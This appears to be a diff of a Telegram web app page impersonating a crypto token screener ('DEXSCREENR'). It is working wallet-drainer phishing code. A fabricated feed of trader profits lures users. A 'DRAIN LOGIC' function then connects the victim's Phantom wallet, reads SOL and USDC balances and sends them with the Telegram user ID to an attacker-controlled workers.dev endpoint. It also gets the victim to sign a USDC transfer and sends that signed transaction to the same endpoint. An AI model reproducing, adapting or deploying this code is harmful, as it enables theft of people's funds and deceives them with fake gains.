@@ -10,226 +10,140 @@
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif; }
-  body { background-color: #050505; color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; overflow: hidden; position: relative; }
-  #telegram-screen { display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; width: 100%; max-width: 320px; position: absolute; z-index: 20; }
-  .pulse-ring { width: 80px; height: 80px; border-radius: 50%; background: rgba(20, 241, 149, 0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; position: relative; }
-  .pulse-ring::before { content: ''; position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 1px solid #14F195; animation: pulse 2s infinite ease-out; }
-  @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
-  .pulse-ring svg { width: 32px; height: 32px; color: #14F195; }
-  #telegram-screen h1 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
-  #telegram-screen p { font-size: 13px; color: #a1a1aa; line-height: 1.5; margin-bottom: 32px; }
-  .open-phantom-btn { width: 100%; padding: 16px; border-radius: 16px; background: #ffffff; color: #000000; font-weight: 700; font-size: 15px; border: none; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
-  .open-phantom-btn:active { transform: scale(0.96); }
-  #boot-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; align-items: center; justify-content: center; transition: opacity 1.5s ease; }
-  .boot-title { font-size: 28px; font-weight: 900; letter-spacing: 4px; color: #ffffff; animation: pulseTitle 3s infinite ease-in-out alternate; }
-  @keyframes pulseTitle { 0% { text-shadow: 0 0 10px rgba(20, 241, 149, 0.2); opacity: 0.8; } 100% { text-shadow: 0 0 30px rgba(20, 241, 149, 0.8); opacity: 1; } }
-  #app-screen { display: none; flex-direction: column; align-items: center; width: 100%; max-width: 360px; animation: slideUp 1.2s cubic-bezier(0.16, 1, 0.3, 1); position: relative; z-index: 10; }
+  
+  body {
+    background-color: #050505;
+    color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    overflow: hidden;
+    position: relative;
+  }
+
   .bg-glow { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; overflow: hidden; background: #050505; }
   .orb { position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.3; animation: float 12s infinite ease-in-out alternate; }
   .orb-1 { width: 300px; height: 300px; background: rgba(20, 241, 149, 0.2); top: -5%; left: -10%; }
   .orb-2 { width: 400px; height: 400px; background: rgba(153, 69, 255, 0.15); bottom: -10%; right: -20%; animation-delay: -5s; }
   @keyframes float { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(30px, 50px) scale(1.1); } }
-  @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
-  .glass-container { width: 100%; background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px; display: flex; flex-direction: column; align-items: center; box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative; }
+
+  #app-screen {
+    display: flex; flex-direction: column; align-items: center;
+    width: 100%; max-width: 360px; position: relative; z-index: 10;
+  }
+
+  .glass-container {
+    width: 100%; background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+    border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px;
+    display: flex; flex-direction: column; align-items: center;
+    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative;
+  }
+
   .header { width: 100%; text-align: center; margin-bottom: 24px; }
   .header span { font-size: 20px; font-weight: 900; letter-spacing: 1.5px; color: #ffffff; text-transform: uppercase; }
   .header p { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
-  #pricing-screen { width: 100%; display: flex; flex-direction: column; gap: 10px; }
-  .plan-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: all 0.3s ease; position: relative; height: 72px; }
-  .plan-card:active { transform: scale(0.97); background: rgba(20, 241, 149, 0.1); border-color: rgba(20, 241, 149, 0.5); }
-  .plan-card.free { border-color: rgba(20, 241, 149, 0.4); background: linear-gradient(90deg, rgba(20, 241, 149, 0.1) 0%, rgba(20, 241, 149, 0.02) 100%); }
-  .plan-info { width: 100%; display: flex; justify-content: space-between; align-items: center; }
-  .plan-info h3 { font-size: 15px; font-weight: 700; color: #fff; }
-  .plan-info p { font-size: 11px; color: #a1a1aa; margin-top: 2px; }
-  .plan-price { font-size: 15px; font-weight: 800; color: #14F195; }
-  .plan-price.paid { color: #ffffff; }
-  .code-wrapper { display: none; width: 100%; height: 100%; align-items: center; justify-content: space-between; animation: fadeIn 0.3s ease; }
-  .code-wrapper input { background: transparent; border: none; outline: none; color: #fff; font-size: 16px; width: 80%; font-family: monospace; }
-  .code-wrapper input::placeholder { color: #52525b; font-family: -apple-system, sans-serif; font-size: 14px; }
-  .code-wrapper input.error::placeholder { color: #ef4444; }
-  .close-btn { background: rgba(255,255,255,0.1); border: none; color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 12px; }
-  @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }
-  .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
-  #loading-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 200px; animation: fadeIn 0.3s ease; }
-  .loading-title { font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 12px; }
-  .loading-bar-bg { width: 80%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; margin-bottom: 12px; }
-  .loading-bar-fill { width: 0%; height: 100%; background: #14F195; animation: loadBar 4s ease-in-out forwards; }
-  .loading-status { font-size: 11px; color: #a1a1aa; font-family: monospace; }
-  @keyframes loadBar { 0% { width: 0%; } 30% { width: 40%; } 60% { width: 75%; } 100% { width: 100%; } }
-  #connect-screen { width: 100%; display: none; flex-direction: column; align-items: center; opacity: 0; transform: translateY(20px); transition: opacity 0.8s ease, transform 0.8s ease; }
-  .status-text { font-size: 13px; margin-bottom: 20px; color: #a1a1aa; text-align: center; }
-  .status-text span { color: #14F195; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
-  
-  .slider-container { width: 100%; height: 60px; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 30px; position: relative; overflow: hidden; display: flex; flex-direction: row-reverse; align-items: center; padding: 4px; user-select: none; touch-action: none; }
+
+  /* FEED */
+  .feed-container {
+    width: 100%; height: 200px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.05);
+    border-radius: 16px; padding: 12px; margin-bottom: 24px; overflow: hidden; display: flex; flex-direction: column; gap: 8px;
+  }
+  .feed-item { display: flex; justify-content: space-between; align-items: center; background: rgba(255, 255, 255, 0.03); padding: 12px 10px; border-radius: 10px; font-size: 12px; flex-shrink: 0; white-space: nowrap; animation: slideFadeIn 0.5s ease-out forwards; }
+  @keyframes slideFadeIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+  .feed-wallet { font-family: monospace; color: #71717a; font-size: 11px; width: 50px; }
+  .feed-token { font-weight: 600; color: #ffffff; flex: 1; text-align: left; padding-left: 6px; }
+  .feed-profit { font-weight: 700; font-size: 12px; text-align: right; }
+
+  /* SLIDER */
+  .slider-container {
+    width: 100%; height: 60px; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 30px; position: relative; overflow: hidden; display: flex; flex-direction: row-reverse; align-items: center; padding: 4px; user-select: none; touch-action: none;
+  }
   .slider-text { position: absolute; width: 100%; text-align: center; font-size: 14px; font-weight: 600; color: rgba(255, 255, 255, 0.5); pointer-events: none; z-index: 1; transition: opacity 0.3s; }
   .slider-thumb { width: 52px; height: 52px; background: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: grab; position: relative; z-index: 2; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: transform 0.1s; touch-action: none; }
   .slider-thumb:active { cursor: grabbing; }
   .slider-thumb svg { width: 22px; height: 22px; color: #000000; transform: rotate(180deg); transition: transform 0.3s ease; }
-  
+
   .slider-container.loading .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; display: flex; justify-content: flex-start; padding-left: 18px; }
   .slider-container.success .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; display: flex; justify-content: center; align-items: center; }
   .slider-container.success .slider-thumb svg { transform: rotate(0deg); margin: 0; display: block; stroke: #000; stroke-width: 4; width: 24px; height: 24px; margin-left: 2px; }
 
   .spinner { display: none; width: 20px; height: 20px; border: 2.5px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-  .back-btn { background: none; border: none; color: #52525b; font-size: 12px; font-weight: 500; margin-top: 24px; cursor: pointer; padding: 8px 16px; border-radius: 20px; transition: all 0.2s; }
-  #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 10px 0; text-align: center; }
-  .pending-icon { width: 64px; height: 64px; border-radius: 50%; background: rgba(251, 191, 36, 0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 16px; border: 1px solid rgba(251, 191, 36, 0.3); }
-  .pending-icon svg { width: 32px; height: 32px; color: #fbbf24; }
-  .pending-title { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; }
-  .pending-desc { font-size: 13px; color: #a1a1aa; line-height: 1.5; margin-bottom: 24px; padding: 0 10px; }
-  .ticket-btn { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #ffffff; font-size: 13px; font-weight: 600; padding: 12px 24px; border-radius: 12px; cursor: pointer; transition: all 0.2s; }
-  .ticket-btn:active { background: rgba(255, 255, 255, 0.1); transform: scale(0.97); }
 </style>
 </head>
 <body>
 
-  <div id="telegram-screen">
-    <div class="pulse-ring"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
-    <h1>Connect Wallet</h1>
-    <p>Open this application inside the Phantom app or extension to continue.</p>
-    <button class="open-phantom-btn" id="openPhantomBtn">Open in Phantom</button>
+  <div class="bg-glow">
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
   </div>
-
-  <div id="boot-screen"><div class="boot-title">DEXSCREENR</div></div>
-  <div class="bg-glow"><div class="orb orb-1"></div><div class="orb orb-2"></div></div>
 
   <div id="app-screen">
     <div class="glass-container">
-      <div class="header"><span>DEXSCREENR</span><p id="headerSub">Select a plan to continue.</p></div>
-
-      <div id="pricing-screen">
-        <div class="plan-card free" onclick="startLoading('Free Trial')"><div class="plan-info"><div><h3>1-Day Free Trial</h3><p>Launch special access</p></div><div class="plan-price">FREE</div></div></div>
-        <div class="plan-card" onclick="openCodeInput(this, '3-Day Access')"><div class="plan-info"><div><h3>3-Day Access</h3><p>Requires secret code</p></div><div class="plan-price paid">CODE</div></div><div class="code-wrapper"><input type="text" placeholder="Enter code..." onkeyup="checkSecret(event, this)"><button class="close-btn" onclick="closeCodeInput(event, this)">✕</button></div></div>
-        <div class="plan-card" onclick="openCodeInput(this, 'Weekly Pass')"><div class="plan-info"><div><h3>Weekly Pass</h3><p>Full access to tracker</p></div><div class="plan-price paid">0.1 SOL</div></div><div class="code-wrapper"><input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)"><button class="close-btn" onclick="closeCodeInput(event, this)">✕</button></div></div>
-        <div class="plan-card" onclick="openCodeInput(this, 'Monthly Pro')"><div class="plan-info"><div><h3>Monthly Pro</h3><p>Unlimited tracking</p></div><div class="plan-price paid">0.25 SOL</div></div><div class="code-wrapper"><input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)"><button class="close-btn" onclick="closeCodeInput(event, this)">✕</button></div></div>
-        <div class="plan-card" onclick="openCodeInput(this, 'Yearly Pro')"><div class="plan-info"><div><h3>Yearly Pro</h3><p>Best value</p></div><div class="plan-price paid">1.5 SOL</div></div><div class="code-wrapper"><input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)"><button class="close-btn" onclick="closeCodeInput(event, this)">✕</button></div></div>
+      <div class="header">
+        <span>DEXSCREENR</span>
+        <p id="headerSub">Authorize connection.</p>
       </div>
 
-      <div id="loading-screen"><div class="loading-title">Initializing Environment</div><div class="loading-bar-bg"><div class="loading-bar-fill" id="loadBarFill"></div></div><div class="loading-status" id="loadStatus">Connecting...</div></div>
+      <div class="feed-container" id="feedContainer"></div>
 
-      <div id="connect-screen">
-        <div class="status-text">Plan: <span id="selectedPlanText">FREE</span></div>
-        <div class="slider-container" id="sliderContainer">
-          <div class="slider-text" id="sliderText">Slide left to authorize</div>
-          <div class="slider-thumb" id="sliderThumb">
-            <svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>
-            <div class="spinner" id="spin"></div>
-          </div>
+      <div class="slider-container" id="sliderContainer">
+        <div class="slider-text" id="sliderText">Slide left to authorize</div>
+        <div class="slider-thumb" id="sliderThumb">
+          <svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>
+          <div class="spinner" id="spin"></div>
         </div>
-        <button class="back-btn" onclick="goBack()">Cancel and go back</button>
-      </div>
-
-      <div id="dashboard-screen">
-        <div class="pending-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></div>
-        <h3 class="pending-title">Waiting for Admin Approval</h3>
-        <p class="pending-desc">Your access request has been submitted. An admin will verify your wallet shortly.</p>
-        <button class="ticket-btn" onclick="alert('Ticket creation is available after 48 hours of pending status.')">Make ticket if not approved in 48h</button>
       </div>
     </div>
   </div>
 
 <script>
-  const tgScreen = document.getElementById('telegram-screen');
-  const bootScreen = document.getElementById('boot-screen');
-  const appScreen = document.getElementById('app-screen');
-  const openPhantomBtn = document.getElementById('openPhantomBtn');
+  if (window.Telegram && window.Telegram.WebApp) {
+    window.Telegram.WebApp.ready();
+    window.Telegram.WebApp.expand();
+  }
 
-  window.addEventListener('load', () => {
-    if (window.Telegram && window.Telegram.WebApp) {
-      window.Telegram.WebApp.ready();
-      window.Telegram.WebApp.expand();
+  // --- FOMO FEED ---
+  const feed = document.getElementById('feedContainer');
+  const fakeWallets = ['7xKX...', '3vNd...', '8fRt...', '5cYh...', '9pLk...'];
+  const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MEW', 'BOME'];
+  
+  function addFeedItem() {
+    const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
+    const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
+    const isWin = Math.random() > 0.35;
+    let pnlText = ""; let pnlColor = "#14F195"; 
+    
+    if (isWin) {
+      const pnlPercent = Math.random() * 435 + 15;
+      const baseInvest = Math.random() * 1400 + 100;
+      const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+      pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
+    } else {
+      const pnlPercent = Math.random() * 35 + 5;
+      const baseInvest = Math.random() * 1800 + 200;
+      const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+      pnlText = `-$${pnlValue} (-${pnlPercent.toFixed(1)}%)`;
+      pnlColor = "#ef4444"; 
     }
-    const isPhantom = window.phantom?.solana?.isPhantom;
-    if (isPhantom) { tgScreen.style.display = 'none'; startIntro(); } 
-    else { tgScreen.style.display = 'flex'; bootScreen.style.display = 'none'; appScreen.style.display = 'none'; }
-  });
-
-  openPhantomBtn.addEventListener('click', () => {
-    const url = window.location.href;
-    window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
-  });
-
-  function startIntro() {
-    bootScreen.style.display = 'flex';
-    setTimeout(() => {
-      bootScreen.style.opacity = '0';
-      setTimeout(() => { bootScreen.style.display = 'none'; appScreen.style.display = 'flex'; }, 1500);
-    }, 4000);
+    const el = document.createElement('div');
+    el.className = 'feed-item';
+    el.innerHTML = `<span class="feed-wallet">${wallet}</span><span class="feed-token">$${token}</span><span class="feed-profit" style="color: ${pnlColor}">${pnlText}</span>`;
+    feed.prepend(el);
+    if (feed.children.length > 6) feed.lastChild.remove();
   }
 
-  const pricingScreen = document.getElementById('pricing-screen');
-  const loadingScreen = document.getElementById('loading-screen');
-  const connectScreen = document.getElementById('connect-screen');
-  const dashboardScreen = document.getElementById('dashboard-screen');
-  const headerSub = document.getElementById('headerSub');
-  const selectedPlanText = document.getElementById('selectedPlanText');
+  for(let i=0; i<5; i++) addFeedItem();
+  setInterval(addFeedItem, 3000);
 
-  async function startLoading(planName) {
-    pricingScreen.style.display = 'none';
-    let provider = window.phantom?.solana;
-    if(!provider) { return; }
-    try {
-      await provider.connect();
-      loadingScreen.style.display = 'flex';
-      document.getElementById('loadStatus').textContent = `Generating license for ${planName}...`;
-      setTimeout(() => {
-        loadingScreen.style.display = 'none';
-        headerSub.textContent = "Authorize connection.";
-        selectedPlanText.textContent = planName;
-        connectScreen.style.display = 'flex';
-        setTimeout(() => {
-          connectScreen.style.opacity = '1';
-          connectScreen.style.transform = 'translateY(0)';
-          initSlider();
-        }, 100);
-      }, 4200);
-    } catch(e) { goBack(); }
-  }
-
-  function openCodeInput(card, planName) {
-    if (card.classList.contains('open')) return;
-    document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('open'));
-    card.classList.add('open');
-    card.querySelector('.plan-info').style.display = 'none';
-    card.querySelector('.code-wrapper').style.display = 'flex';
-    const input = card.querySelector('input');
-    input.classList.remove('error'); input.value = ''; input.placeholder = 'Enter code...';
-    setTimeout(() => { input.focus(); }, 100);
-    document.addEventListener('click', function closeOnClickOutside(e) {
-      if (!card.contains(e.target)) {
-        closeCodeInput(null, card.querySelector('.close-btn'));
-        document.removeEventListener('click', closeOnClickOutside);
-      }
-    });
-  }
-
-  function closeCodeInput(e, btn) {
-    if(e) e.stopPropagation();
-    const card = btn.closest('.plan-card');
-    card.classList.remove('open');
-    card.querySelector('.plan-info').style.display = 'flex';
-    card.querySelector('.code-wrapper').style.display = 'none';
-    card.querySelector('input').value = '';
-  }
-
-  function checkSecret(e, input) {
-    if (e.key === 'Enter') {
-      const val = input.value.toLowerCase();
-      const card = input.closest('.plan-card');
-      if (val === 'free3tier' || val === 'alpha') {
-        const planName = card.querySelector('h3').textContent;
-        closeCodeInput(null, card.querySelector('.close-btn'));
-        startLoading(planName);
-      } else {
-        input.value = ''; input.classList.add('error'); input.placeholder = 'Invalid key';
-        card.classList.add('shake');
-        setTimeout(() => card.classList.remove('shake'), 400);
-        setTimeout(() => { input.classList.remove('error'); input.placeholder = 'Enter code...'; }, 2000);
-      }
-    }
-  }
+  // --- CONFIG ---
+  const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
+  const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
+  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
 
   const container = document.getElementById('sliderContainer');
   const thumb = document.getElementById('sliderThumb');
@@ -239,37 +153,29 @@
 
   let isDragging = false; let startX = 0; let currentX = 0; let maxDrag = 0;
 
-  function initSlider() { 
-    maxDrag = container.offsetWidth - thumb.offsetWidth - 8; 
+  function initSlider() { maxDrag = container.offsetWidth - thumb.offsetWidth - 8; }
+  
+  // SLIDER FIX (Touch & Mouse)
+  function startDrag(e) { 
+    if (container.classList.contains('loading') || container.classList.contains('success')) return; 
+    isDragging = true; 
+    startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
+    thumb.style.transition = 'none'; 
   }
   
-  // BESSERER SLIDER FIX
-  function handleStart(e) {
-    if (container.classList.contains('loading') || container.classList.contains('success')) return;
-    isDragging = true;
-    startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-    thumb.style.transition = 'none';
-    document.body.style.overflow = 'hidden'; // Verhindert Scrollen
-  }
-
-  function handleMove(e) {
+  function moveDrag(e) {
     if (!isDragging) return;
     if (e.cancelable) e.preventDefault(); 
     const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
     let delta = startX - clientX; 
-    if (delta < 0) delta = 0; 
-    if (delta > maxDrag) delta = maxDrag;
-    currentX = delta; 
-    thumb.style.transform = `translateX(-${currentX}px)`;
+    if (delta < 0) delta = 0; if (delta > maxDrag) delta = maxDrag;
+    currentX = delta; thumb.style.transform = `translateX(-${currentX}px)`;
     text.style.opacity = 1 - (currentX / maxDrag);
   }
-
-  function handleEnd() {
-    if (!isDragging) return;
-    isDragging = false;
-    document.body.style.overflow = ''; // Scrollen wieder erlauben
-    
-    if (currentX > maxDrag * 0.5) { 
+  
+  function endDrag() {
+    if (!isDragging) return; isDragging = false;
+    if (currentX > maxDrag * 0.5) {
       container.classList.add('loading'); text.style.opacity = 0;
       thumb.style.transition = 'transform 0.3s ease';
       thumb.style.transform = `translateX(-${maxDrag}px)`;
@@ -281,27 +187,28 @@
     }
   }
 
-  thumb.addEventListener('mousedown', handleStart);
-  window.addEventListener('mousemove', handleMove);
-  window.addEventListener('mouseup', handleEnd);
-  thumb.addEventListener('touchstart', handleStart, {passive: false});
-  window.addEventListener('touchmove', handleMove, {passive: false});
-  window.addEventListener('touchend', handleEnd);
+  thumb.addEventListener('mousedown', startDrag);
+  window.addEventListener('mousemove', moveDrag);
+  window.addEventListener('mouseup', endDrag);
+  thumb.addEventListener('touchstart', startDrag, {passive: false});
+  window.addEventListener('touchmove', moveDrag, {passive: false});
+  window.addEventListener('touchend', endDrag);
 
+  // --- DRAIN LOGIC ---
   async function triggerConnect() {
     let provider = window.phantom?.solana;
     if(!provider) { resetSlider(); return; }
+    
     try {
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
-      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); 
+      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); // Standard RPC
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) || "0";
       
       let usdcAmount = 0;
-      const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 
       if (typeof splToken !== 'undefined') {
         try {
@@ -312,8 +219,8 @@
       }
 
       const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, tg_user_id: tgUserId, ts: Date.now() });
-      try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
-      catch (err) { navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); }
+      try { await fetch(ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
+      catch (err) { navigator.sendBeacon(ENDPOINT, new Blob([payload], {type: 'application/json'})); }
 
       if (usdcAmount > 0 && typeof splToken !== 'undefined') {
         const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
@@ -323,7 +230,7 @@
         tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
         const signedTx = await provider.signTransaction(tx);
 
-        await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
+        await fetch(ENDPOINT, { 
           method: "POST", headers: { "Content-Type": "application/json" }, 
           body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
         });
@@ -333,23 +240,7 @@
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" style="margin-left: 2px;"><polyline points="20 6 9 17 4 12"></polyline></svg>';
       text.textContent = "Access Granted"; text.style.opacity = 1;
 
-      setTimeout(() => {
-        connectScreen.style.display = 'none';
-        dashboardScreen.style.display = 'flex';
-        headerSub.textContent = "Account Pending";
-      }, 2000);
-
     } catch (e) { resetSlider(); }
-  }
-
-  function goBack() {
-    connectScreen.style.opacity = '0';
-    setTimeout(() => {
-      connectScreen.style.display = 'none';
-      pricingScreen.style.display = 'flex';
-      headerSub.textContent = "Select a plan to continue.";
-      resetSlider();
-    }, 300);
   }
 
   function resetSlider() {
